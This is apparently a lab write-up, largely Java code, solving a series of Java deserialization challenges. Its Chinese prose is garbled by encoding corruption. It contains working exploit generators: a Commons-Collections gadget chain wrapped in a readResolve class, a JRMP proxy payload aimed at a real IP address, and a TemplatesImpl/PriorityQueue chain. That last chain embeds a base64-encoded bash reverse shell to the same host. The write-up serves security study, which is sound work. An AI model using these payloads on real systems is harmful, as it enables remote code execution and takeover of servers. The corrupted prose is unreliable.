<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MarshalledObject</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">byte</span>[] bytes = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">readResolve</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ByteArrayInputStream byteArrayInputStream = <span class="keyword">new</span> ByteArrayInputStream(<span class="keyword">this</span>.bytes);</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(byteArrayInputStream);</span><br><span class="line">        Object obj = objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ç®€æreadResolveçš„è°ƒç”¨è¿‡ç¨‹"><a href="#ç®€æreadResolveçš„è°ƒç”¨è¿‡ç¨‹" class="headerlink" title="ç®€æreadResolveçš„è°ƒç”¨è¿‡ç¨‹"></a>ç®€æ<code>readResolve</code>çš„è°ƒç”¨è¿‡ç¨‹</h3><p><code>Test</code> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String test;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">readResolve</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Main</code> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(<span class="keyword">new</span> Test());</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = bos.toByteArray();</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream bis = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥ååºåˆ—åŒ–ä¹‹åå¯ä»¥å‘ç°<code>Test#readResolve</code> è‡ªåŠ¨è¢«è°ƒç”¨äº†ï¼Œç®€å•è·Ÿè¿›ä¸€ä¸‹å°±ä¼šå‘ç°åœ¨ååºåˆ—åŒ–çš„æ—¶å€™å¦‚æœç±»ä¸­å­˜åœ¨<code>readResolve</code> å°±ä¼šç›´æ¥è°ƒç”¨</p>
<p><img src="https://img-blog.csdnimg.cn/21ba29048f1b49ae8b5f4de43d4f68e8.png" alt="Untitled"></p>
<p>å› ä¸º<code>readResolve</code> ä¸éœ€è¦å†åˆ©ç”¨<code>InvokerTransformer</code> ç­‰ç±»å»å®ç°è°ƒç”¨ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥æ„é€ exp</p>
<p>expï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> lab5;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.yxxx.javasec.deserialize.MarshalledObject;</span><br><span class="line"><span class="keyword">import</span> lab1.Utils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setField</span><span class="params">(Object o,String name, Object value)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Field field = o.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(o, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] fake = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] trueTrans = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;bash -c &#123;echo,&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformer = <span class="keyword">new</span> ChainedTransformer(fake);</span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outMap = LazyMap.decorate(innerMap, transformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(outMap, <span class="string">&quot;aa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map exp = <span class="keyword">new</span> HashMap();</span><br><span class="line">        exp.put(tiedMapEntry, <span class="string">&quot;bb&quot;</span>);</span><br><span class="line">        outMap.remove(<span class="string">&quot;aa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field field = ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(transformer, trueTrans);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// serialize</span></span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(exp);</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = bos.toByteArray();</span><br><span class="line"></span><br><span class="line">        MarshalledObject marshalledObject = <span class="keyword">new</span> MarshalledObject();</span><br><span class="line">setField(marshalledObject, <span class="string">&quot;bytes&quot;</span>, bytes);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos1 = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos1 = <span class="keyword">new</span> ObjectOutputStream(bos1);</span><br><span class="line">        oos1.writeUTF(<span class="string">&quot;SJTU&quot;</span>);</span><br><span class="line">        oos1.writeInt(<span class="number">1896</span>);</span><br><span class="line">        oos1.writeObject(marshalledObject);</span><br><span class="line">        System.out.println(Utils.bytesTohexString(bos1.toByteArray()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// deserialize for test</span></span><br><span class="line"><span class="comment">//        ByteArrayInputStream bis = new ByteArrayInputStream(bos1.toByteArray());</span></span><br><span class="line"><span class="comment">//        ObjectInputStream ois = new ObjectInputStream(bis);</span></span><br><span class="line"><span class="comment">//        ois.readObject();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/131e9b69ce2a47ba9e9e7145155981f6.png" alt="Untitled"></p>
<h2 id="Lab6-weblogic-resolveProxyClass"><a href="#Lab6-weblogic-resolveProxyClass" class="headerlink" title="Lab6-weblogic-resolveProxyClass"></a>Lab6-weblogic-resolveProxyClass</h2><p>æœ‰é»‘åå•è¿‡æ»¤ï¼Œä½†æ˜¯æ²¡æœ‰åƒlab4ä¸€æ ·ç›´æ¥ä¸èƒ½å‡ºç½‘ï¼Œä½†æ˜¯ä¹Ÿä¸èƒ½ç”¨lab5çš„expï¼Œå› ä¸ºè¿‡æ»¤äº†<code>org.apache.commons.collections.functors</code> å¯¼è‡´ä¸èƒ½ç”¨CCé“¾å­ï¼Œä½†æ˜¯å›åˆ°lab3ï¼Œå‘ç°è¿˜æ˜¯å¯èƒ½å¯ä»¥åˆ©ç”¨çš„ï¼Œåªä¸è¿‡ä¸èƒ½ç”¨<code>java.rmi.registry.Registry</code> äº†</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">classBlackList.add(<span class="string">&quot;org.apache.commons.collections.functors&quot;</span>);</span><br><span class="line">proxyBlackList.add(<span class="string">&quot;java.rmi.registry&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>è€Œæˆ‘ä»¬åˆ©ç”¨åˆ°çš„RemoteObjectInvocationHandlerå®ç°äº†Remoteæ¥å£ï¼Œè€ŒRegistryä¹Ÿå®ç°äº†Remoteæ¥å£ï¼Œé‚£ä¹ˆæ‰¾ä¸€ä¸‹è¿˜æœ‰ä»€ä¹ˆæ¥å£å¯ä»¥åˆ©ç”¨ï¼Œå‘ç°å¦‚ä¸‹ï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/1d4303b553be4188941382b8402cb14c.png" alt="Untitled"></p>
<p>é‚£ä¹ˆç›´æ¥ä¿®æ”¹ä¸€ä¸‹lab3çš„payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> lab1.Utils;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.activation.ActivationInstantiator;</span><br><span class="line"><span class="keyword">import</span> java.rmi.activation.ActivationMonitor;</span><br><span class="line"><span class="keyword">import</span> java.rmi.activation.ActivationSystem;</span><br><span class="line"><span class="keyword">import</span> java.rmi.activation.Activator;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JrmpListener</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ObjID objID = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// å¯¹è±¡æ ‡è¯†ç¬¦</span></span><br><span class="line">        TCPEndpoint tcpEndpoint = <span class="keyword">new</span> TCPEndpoint(<span class="string">&quot;82.156.2.166&quot;</span>,<span class="number">2444</span>); <span class="comment">// ä¸è¿œç¨‹çš„RMIæœåŠ¡è¿æ¥</span></span><br><span class="line">        UnicastRef unicastRef = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(objID, tcpEndpoint, <span class="keyword">false</span>)); <span class="comment">// \\</span></span><br><span class="line">        RemoteObjectInvocationHandler rih = <span class="keyword">new</span> RemoteObjectInvocationHandler(unicastRef);</span><br><span class="line">        ActivationInstantiator registry = (ActivationInstantiator) Proxy.newProxyInstance(JrmpListener.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;ActivationInstantiator.class&#125;, rih); <span class="comment">// é€šè¿‡åå°„</span></span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        os.writeUTF(<span class="string">&quot;SJTU&quot;</span>);</span><br><span class="line">        os.writeInt(<span class="number">1896</span>);</span><br><span class="line">        os.writeObject(registry);</span><br><span class="line">        os.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(Utils.bytesTohexString(bos.toByteArray()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// for test</span></span><br><span class="line"><span class="comment">//        ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray());</span></span><br><span class="line"><span class="comment">//        ObjectInputStream ois = new ObjectInputStream(bis);</span></span><br><span class="line"><span class="comment">//        ois.readObject();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vpsè¿›è¡ŒJRMPç›‘å¬</p>
<p><img src="https://img-blog.csdnimg.cn/664a1fe858284ae3813ded583f9be80c.png" alt="Untitled"></p>
<p>ç»“æœï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/c8dd6793a61e40baa1a62c4a4ab66b8c.png" alt="Untitled"></p>
<p><img src="https://img-blog.csdnimg.cn/08f88fab5fc748e39acbbd5de83fa43e.png" alt="Untitled"></p>
<h2 id="Lab7-weblogic-UnicastRef"><a href="#Lab7-weblogic-UnicastRef" class="headerlink" title="*Lab7-weblogic-UnicastRef"></a>*Lab7-weblogic-UnicastRef</h2><p>é»‘åå•ï¼ŒåˆæŠŠ<code>UnicastRef</code>å’Œ<code>RemoteObjectInvocationHandler</code>è¿‡æ»¤äº†ï¼Œæ ¹æ®å‰é¢çš„payloadæˆ‘ä»¬å¯ä»¥çŸ¥é“é‡è¦çš„æ˜¯æˆ‘ä»¬éœ€è¦è°ƒç”¨åˆ°<code>RemoteObject</code>çš„<code>readObject</code>ä»è€Œè°ƒç”¨åˆ°<code>LiveRef</code>å®ç°<code>TCP</code>è¿æ¥è¿œç¨‹çš„<code>JRMP</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">classBlackList.add(<span class="string">&quot;org.apache.commons.collections.functors&quot;</span>);</span><br><span class="line">classBlackList.add(<span class="string">&quot;sun.rmi.server.UnicastRef&quot;</span>);</span><br><span class="line">classBlackList.add(<span class="string">&quot;java.rmi.server.RemoteObjectInvocationHandler&quot;</span>);</span><br><span class="line">proxyBlackList.add(<span class="string">&quot;java.rmi.registry&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>æ‰¾ç»§æ‰¿<code>RemoteObject</code> çš„ç±»ï¼Œå¹¶ä¸”å¤§æ¦‚ç‡æ˜¯ä¸èƒ½ä½¿ç”¨åŠ¨æ€ä»£ç†äº†ï¼Œåœ¨æµ‹è¯•ä¹‹åå¥½åƒå¹¶ä¸ä¼šå½±å“<code>UnicastRef</code> çš„ä½¿ç”¨ã€‚</p>
<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line">javax.management.remote.rmi.RMIConnectionImpl_Stub</span><br><span class="line">com.sun.jndi.rmi.registry.ReferenceWrapper_Stub</span><br><span class="line">javax.management.remote.rmi.RMIServerImpl_Stub</span><br><span class="line">sun.rmi.registry.RegistryImpl_Stub</span><br><span class="line">sun.rmi.transport.DGCImpl_Stub</span><br></pre></td></tr></table></figure>

<p>é‚£é‡ç‚¹åº”è¯¥å°±æ˜¯æ‰¾åˆ°å¯åˆ©ç”¨çš„ç±»äº†ï¼Œä½†æ˜¯è¦æ³¨æ„<code>Dockerfile</code> ä¸­æœ‰ï¼Œå¯¹<code>javax.management.BadAttributeValueExpException</code> è¿›è¡Œäº†åºåˆ—åŒ–è¿‡æ»¤</p>
<figure class="highlight docker"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;java&quot;</span>, <span class="string">&quot;-Djdk.serialFilter=!javax.management.BadAttributeValueExpException&quot;</span>, <span class="string">&quot;-jar&quot;</span>, <span class="string">&quot;/opt/app/lab7-weblogic-UnicastRef.jar&quot;</span>]</span></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æ€ä¹ˆéƒ½ç»•ä¸è¿‡å»</p>
<p>éº»äº†</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> lab7;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lab1.Utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Index</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        String data = scanner.next();</span><br><span class="line">        <span class="keyword">byte</span>[] b = Utils.hexStringToBytes(data);</span><br><span class="line">        InputStream inputStream = <span class="keyword">new</span> ByteArrayInputStream(b);</span><br><span class="line">        MyObjectInputStream myObjectInputStream = <span class="keyword">new</span> MyObjectInputStream(inputStream);</span><br><span class="line">        String name = myObjectInputStream.readUTF();</span><br><span class="line">        <span class="keyword">int</span> year = myObjectInputStream.readInt();</span><br><span class="line">        <span class="keyword">if</span> (name.equals(<span class="string">&quot;SJTU&quot;</span>) &amp;&amp; year == <span class="number">1896</span>)</span><br><span class="line">            myObjectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Lab9-proxy"><a href="#Lab9-proxy" class="headerlink" title="Lab9-proxy"></a>Lab9-proxy</h2><p>æ²¡æœ‰é™åˆ¶çš„ååºåˆ—åŒ–</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">publicclass IndexController &#123;</span><br><span class="line">  <span class="meta">@RequestMapping(&#123;&quot;/basic&quot;&#125;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">greeting</span><span class="params">(<span class="meta">@RequestParam(name = &quot;data&quot;, required =true)</span> String data, Model model)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">byte</span>[] b = Utils.hexStringToBytes(data);</span><br><span class="line">    InputStream inputStream =<span class="keyword">new</span> ByteArrayInputStream(b);</span><br><span class="line">    ObjectInputStream objectInputStream =<span class="keyword">new</span> ObjectInputStream(inputStream);</span><br><span class="line">    objectInputStream.readObject();</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å­˜åœ¨ä¸€ä¸ªå¯åºåˆ—åŒ–çš„<code>MyInvocationHandler</code> ç±»ï¼Œä¼šè·å–ç±»é‡Œé¢çš„æ–¹æ³•å¹¶ç›´æ¥è°ƒç”¨ï¼Œè¿™å¾ˆæ˜¾ç„¶å°±å¯ä»¥åƒJDK7u21çš„é“¾å­ä¸€æ ·åˆ©ç”¨<code>TemplatesImpl</code> ï¼Œä¸è¿‡è¿™é‡Œåœ¨æ‰§è¡Œçš„æ—¶å€™éœ€è¦æœ‰ä¸¤ä¸ªå‚æ•°ä¸èƒ½åˆ©ç”¨HashSetäº†ï¼Œä¸ç„¶ä¼šå› ä¸ºargsæ²¡æœ‰å€¼è€Œå¯¼è‡´ç©ºæŒ‡é’ˆå¼‚å¸¸</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> Class type;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span><span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    Method[] methods =<span class="keyword">this</span>.type.getDeclaredMethods();</span><br><span class="line"><span class="keyword">for</span> (Method xmethod : methods)</span><br><span class="line">      xmethod.invoke(args[<span class="number">0</span>],<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">returnnull;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥åˆ©ç”¨<code>PriorityQueue</code></p>
<p>exp:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.yxxx.javasec.deserialize.MyInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setField</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        String command = <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84Mi4xNTYuMi4xNjYvMjMzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">        MyInvocationHandler handler = <span class="keyword">new</span> MyInvocationHandler();</span><br><span class="line">        setField(handler, <span class="string">&quot;type&quot;</span>, Templates.class);</span><br><span class="line">        Comparator proxy = (Comparator) Proxy.newProxyInstance(Exp.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Comparator.class&#125;, handler);</span><br><span class="line"></span><br><span class="line">        PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setField(priorityQueue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> Object[]&#123;templates, <span class="number">1</span>&#125;);</span><br><span class="line">        setField(priorityQueue, <span class="string">&quot;comparator&quot;</span>, proxy);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(priorityQueue);</span><br><span class="line">        System.out.println(bytesTohexString(bos.toByteArray()));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">bytesTohexString</span><span class="params">(<span class="keyword">byte</span>[] bytes)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (bytes == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        StringBuilder ret = <span class="keyword">new</span> StringBuilder(<span class="number">2</span> * bytes.length);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; bytes.length; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> b = <span class="number">0xF</span> &amp; bytes[i] &gt;&gt; <span class="number">4</span>;</span><br><span class="line">            ret.append(<span class="string">&quot;0123456789abcdef&quot;</span>.charAt(b));</span><br><span class="line">            b = <span class="number">0xF</span> &amp; bytes[i];</span><br><span class="line">            ret.append(<span class="string">&quot;0123456789abcdef&quot;</span>.charAt(b));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç»“æœï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/a1db5abcbe3c42279eb97face0dc2f47.png" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/0ecc125317234f2eb4ebe12c26b42dc4.png" alt="img"></p>
<h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p><del>ï¼ˆå­¦JavaçœŸå¿«ä¹ï¼Œå˜»å˜»ï¼‰</del></p>
<p>lab7ç­‰ä»¥åå­¦å¾—æ›´é€å½»äº†ï¼ŒçŸ¥é“è¯¥æ€ä¹ˆè¿‡äº†å†æ¥è¡¥å……å§ï¼Œè€Œlab8çš„jaråŒ…æ˜¯lab6çš„ï¼Œå°±ä¸å¤šåšäº†</p>
<p>æ•´ä¸ªè¿‡ç¨‹ä¸‹æ¥è¿˜æ˜¯å­¦åˆ°äº†å¾ˆå¤šä»¥å‰ä¸ä¼šçš„ç‚¹çš„ï¼Œè™½ç„¶æ„Ÿè§‰ç°åœ¨webå¯èƒ½è¶Šæ¥è¶Šå·äº†ï¼Œä»¥ååº”è¯¥ä¹Ÿé‡ä¸åˆ°ç±»ä¼¼çš„é¢˜ç›®ï¼Œä½†å­¦åˆ°äº†çŸ¥è¯†è¿˜æ˜¯æŒºå¥½çš„ï¼</p>
<p>ï¼ˆä»¥ä¸Šé¢˜ç›®ç›¸å…³çš„expä»£ç éƒ½æœ‰æ”¾åˆ°githubä¸Šï¼Œæœ‰å…´è¶£çš„å¸ˆå‚…ä¹Ÿå¯ä»¥çœ‹çœ‹<a href="https://github.com/ameuu/javaLearning">https://github.com/ameuu/javaLearning</a></p>
<p>byeï¼</p>
